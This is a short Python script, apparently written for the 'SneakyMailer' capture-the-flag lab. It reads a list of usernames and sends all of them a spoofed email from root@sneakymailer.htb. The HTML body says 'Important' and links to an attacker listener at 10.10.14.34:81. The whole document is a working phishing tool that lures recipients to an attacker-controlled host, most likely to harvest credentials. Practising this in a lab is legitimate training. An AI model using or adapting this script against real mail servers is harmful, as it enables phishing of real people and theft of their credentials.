#!/usr/bin/python3
from email.mime.text import MIMEText
import smtplib
f= open('users','r')
sender = 'root@sneakymailer.htb'
users_arr = [f"{j.strip()}@sneakymailer.htb" for j in f.readlines()]
#receivers = ['airisatou@sneakymailer.htb']
receivers = users_arr
message = """
Important
<a href="http://10.10.14.34:81/">abc</a>
"""
msg = MIMEText(message ,'html')
try:
   smtpObj = smtplib.SMTP('10.129.2.28')
   smtpObj.sendmail(sender, receivers, message)         
   print ("Successfully sent email")
except Exception as e:
   print ("Error: unable to send email", e)
